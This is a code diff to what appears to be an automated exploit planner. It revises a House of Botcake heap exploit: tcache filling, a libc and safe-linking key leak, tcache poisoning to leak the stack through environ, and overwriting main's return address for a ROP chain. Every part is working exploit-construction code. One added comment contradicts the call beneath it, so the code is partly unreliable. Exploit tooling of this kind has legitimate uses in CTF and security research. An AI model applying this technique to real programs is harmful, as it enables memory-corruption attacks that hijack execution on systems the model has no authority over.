@@ -704,24 +704,22 @@ class SmartPlanner:
 
     def _build_house_of_botcake_stages(self):
         """
-        House of Botcake for libc leak + tcache poisoning.
-        Fills tcache (7 entries), puts a chunk in unsorted bin,
-        then double-frees an adjacent chunk via UAF.
-        Returns {"stages": [...], "meta": {...}}.
+        House of Botcake for libc leak + tcache poisoning with safe-linking bypass.
+        Stage 1: Leak libc from unsorted bin + xor_key from tcache tail.
+        Stage 2: Stack leak via tcache poison (free guard, edit guard with safe-linked target).
+        Stage 3: ROP via tcache poison (free r1, edit r1 with safe-linked main_ret_addr).
         """
         main_size = 0x30
         alloc_sz = self._align_size(main_size)
         stages = []
 
-        # Stage 1: Fill tcache + unsorted bin leak via House of Botcake
+        # Stage 1: Fill tcache + unsorted bin leak + xor_key leak
         stage1_ir = []
-        # Alloc 7 filler chunks (to fill tcache)
         for i in range(7):
             stage1_ir.append({
                 "op": "ALLOC", "tag": f"f{i}", "size": main_size,
                 "data_expr": f"b'F' * {main_size}"
             })
-        # Alloc 2 adjacent victim chunks (A, B)
         stage1_ir.append({
             "op": "ALLOC", "tag": "A", "size": main_size,
             "data_expr": "b'A' * 8"
@@ -730,19 +728,23 @@ class SmartPlanner:
             "op": "ALLOC", "tag": "B", "size": main_size,
             "data_expr": "b'B' * 8"
         })
-        # Guard chunk (prevent top consolidation)
         stage1_ir.append({
             "op": "ALLOC", "tag": "guard", "size": main_size,
             "data_expr": "b'G' * 8"
         })
-        # Free 7 filler chunks (fills tcache to 7)
+        # Free all 7 fillers to tcache
         for i in range(7):
             stage1_ir.append({"op": "FREE", "tag": f"f{i}"})
-        # Free A (tcache full → goes to unsorted bin)
+        # Leak xor_key from tcache tail (f0): fd = 0 ^ (f0_addr >> 12)
+        if self.view_choice is not None:
+            stage1_ir.append({
+                "op": "VIEW", "tag": "f0", "save_as": "xor_key",
+                "note": "read_first_8_bytes"
+            })
+        # Free A and B to unsorted bin
         stage1_ir.append({"op": "FREE", "tag": "A"})
-        # Free B (also goes to unsorted via consolidation, linked to A via UAF)
         stage1_ir.append({"op": "FREE", "tag": "B"})
-        # View A to leak libc (fd/bk point to main_arena)
+        # View A to leak libc
         if self.view_choice is not None:
             stage1_ir.append({
                 "op": "VIEW", "tag": "A", "save_as": "libc_leak",
@@ -752,23 +754,23 @@ class SmartPlanner:
             "op": "CALC", "var": "_environ_offset",
             "expr": "libc.symbols['environ']"
         })
-        libc_expr = "libc_leak - 0x60"
+        libc_expr = "libc_leak - LIBC_AUTO_OFFSET"
+        if hasattr(self, 'libc_offsets') and self.libc_offsets.get("main_arena"):
+            ma_off = self.libc_offsets["main_arena"]
+            bins_off = self._bins_offset()
+            libc_expr = f"libc_leak - {hex(ma_off + bins_off)}"
         stage1_ir.append({
             "op": "CALC", "var": "libc.address", "expr": libc_expr
-        })
-        stage1_ir.append({
-            "op": "CALC", "var": "xor_key",
-            "expr": "((libc.address >> 12) ^ libc.address) & 0xfff"
         })
         stage1_ir.append({
             "op": "CALC", "var": "heap_base", "expr": "xor_key << 12"
         })
         stages.append({"name": "leak_libc_botcake", "ir": stage1_ir})
 
-        # Stage 2: Stack leak via environ
+        # Stage 2: Stack leak via tcache poison (free guard, edit, alloc environ)
         stage2_ir = []
-        # Alloc 5 scratch chunks to set up tcache poison target
-        for i in range(5):
+        # Alloc 6 from tcache (count 7→1), leaving only f0
+        for i in range(6):
             stage2_ir.append({
                 "op": "ALLOC", "tag": f"x{i}", "size": main_size,
                 "data_expr": "b'P' * 8"
@@ -777,10 +779,12 @@ class SmartPlanner:
             "op": "CALC", "var": "_environ_target",
             "expr": "libc.address + _environ_offset - 0x18"
         })
-        fd_expr = "p64(_environ_target)"
+        # Free guard → goes to tcache
+        stage2_ir.append({"op": "FREE", "tag": "guard"})
+        fd_expr = "p64(_environ_target ^ xor_key)"
         if self.edit_choice is not None:
             stage2_ir.append({
-                "op": "EDIT", "tag": "B", "data_expr": fd_expr
+                "op": "EDIT", "tag": "guard", "data_expr": fd_expr
             })
         stage2_ir.append({
             "op": "ALLOC", "tag": "fill_e", "size": main_size,
@@ -788,7 +792,7 @@ class SmartPlanner:
         })
         stage2_ir.append({
             "op": "ALLOC", "tag": "env_chunk", "size": main_size,
-            "data_expr": "b'A'"
+            "data_expr": "b'Z'"
         })
         if self.view_choice is not None:
             stage2_ir.append({
@@ -800,16 +804,18 @@ class SmartPlanner:
         })
         stages.append({"name": "leak_stack", "ir": stage2_ir})
 
-        # Stage 3: ROP chain
+        # Stage 3: ROP via tcache poison
         stage3_ir = []
         stage3_ir.append({
             "op": "ALLOC", "tag": "r1", "size": main_size,
             "data_expr": "b'R' * 8"
         })
+        # free fill_e instead of env_chunk (non-heap)
         stage3_ir.append({"op": "FREE", "tag": "env_chunk"})
         stage3_ir.append({"op": "FREE", "tag": "r1"})
         stage3_ir.append({
-            "op": "EDIT", "tag": "r1", "data_expr": "p64(main_ret_addr)"
+            "op": "EDIT", "tag": "r1",
+            "data_expr": "p64(main_ret_addr ^ xor_key)"
         })
         stage3_ir.append({
             "op": "ALLOC", "tag": "fill_r", "size": main_size,
